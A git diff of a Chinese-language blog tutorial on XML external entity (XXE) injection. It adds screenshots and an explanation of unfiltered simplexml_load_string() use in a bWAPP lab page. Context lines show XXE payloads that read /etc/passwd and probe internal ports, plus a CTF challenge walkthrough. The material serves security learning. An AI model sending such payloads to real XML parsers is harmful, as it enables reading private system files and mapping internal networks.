@@ -99,13 +99,15 @@
 <meta property="og:image" content="http://yoursite.com/xxe/11.png">
 <meta property="og:image" content="http://yoursite.com/xxe/12.png">
 <meta property="og:image" content="http://yoursite.com/xxe/13.png">
+<meta property="og:image" content="http://yoursite.com/xxe/17.png">
+<meta property="og:image" content="http://yoursite.com/xxe/18.png">
 <meta property="og:image" content="http://yoursite.com/shen/3.png">
 <meta property="og:image" content="http://yoursite.com/shen/4.png">
 <meta property="og:image" content="http://yoursite.com/shen/5.png">
 <meta property="og:image" content="http://yoursite.com/xxe/15.png">
 <meta property="og:image" content="http://yoursite.com/xxe/16.png">
 <meta property="og:image" content="http://yoursite.com/xxe/14.png">
-<meta property="og:updated_time" content="2018-06-13T05:04:15.869Z">
+<meta property="og:updated_time" content="2018-06-13T05:51:55.783Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XXE漏洞的学习">
 <meta name="twitter:description" content="学习了XXE漏洞，自己来总结一下 传送门https://www.anquanke.com/post/id/86075 0x00 XXE漏洞XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。">
@@ -409,7 +411,7 @@
 <h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</code></p>
 <h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p><code>&lt;!ENTITY %实体名称 &quot;值&quot;&gt;</code><br>or<br><code>&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt;</code></p>
 <p><em>内部实体</em>例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">	&lt;!ELEMENT note (name)&gt;</span><br><span class="line">	&lt;!ENTITY hack3r &quot;Hu3ksy&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line"> &lt;name&gt;&amp;hack3r;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">	&lt;!ELEMENT note (name)&gt;</span><br><span class="line">	&lt;!ENTITY hack3r &quot;Hu3sky&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line"> &lt;name&gt;&amp;hack3r;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
 <p>结果<img src="/xxe/10.png" alt="10"></p>
 <p><em>参数实体+外部实体</em></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
@@ -420,6 +422,7 @@
 <li>DoS</li>
 </ol>
 <h2 id="外部实体引用-有回显"><a href="#外部实体引用-有回显" class="headerlink" title="外部实体引用,有回显"></a>外部实体引用,有回显</h2><h3 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h3><h4 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h4><p>这里我用bWAPP平台上的一道XXE的题目来说明<br>题目是这样的，我们点击这个按钮然后抓包看看<img src="/xxe/11.png" alt="11">。<img src="/xxe/12.png" alt="12">可以看到xxe-1.php页面以POST方式向xxe-2.php页面传输了XML数据，既然是XML数据，我们就可以自己增加一个恶意外部实体然后再原本的XML数据中进行实体调用，来进行XXE攻击，如下：<br><img src="/xxe/13.png" alt="13"><br>可以看到，成功的读取了robots.txt中的内容，这里的hu3sky是我们定义的一个外部实体。</p>
+<p>为了更好理解原理，我们来看一看xxe-2.php的源码。<br>主要代码在这。<img src="/xxe/17.png" alt="17">可以看到这里直接用了<code>simplexml_load_string()</code> 函数获取xml内容，并没有做任何过滤，$login获取login标签里的内容，最后拼接到$message<img src="/xxe/18.png" alt="18"></p>
 <h4 id="例子二"><a href="#例子二" class="headerlink" title="例子二"></a>例子二</h4><p>jarvisoj上的一道题目API调用<br>这道题的题目说明是 请设法获得目标机器/home/ctf/flag.txt中的flag值。<br>进入题目 <a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a> 发现一个输入框，我们对其进行抓包<img src="/shen/3.png" alt="3">发现了json数据，修改发现可以被解析<img src="/shen/4.png" alt="4">。一开始没有思路，后来看了wp，发现是要把json处改为xml。所以就知道了，这题是xxe。修改json处，构造一个xml表单进行xml注入，得到flag。<img src="/shen/5.png" alt="5"></p>
 <h3 id="检测内网端口"><a href="#检测内网端口" class="headerlink" title="检测内网端口"></a>检测内网端口</h3><p>有回显时，直接发送payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0″ encoding=”utf-8″?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line"></span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY XXE SYSTEM &quot;http://127.0.0.1:80&quot; &gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;</span><br><span class="line"></span><br><span class="line">&lt;name&gt;&amp;XXE;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
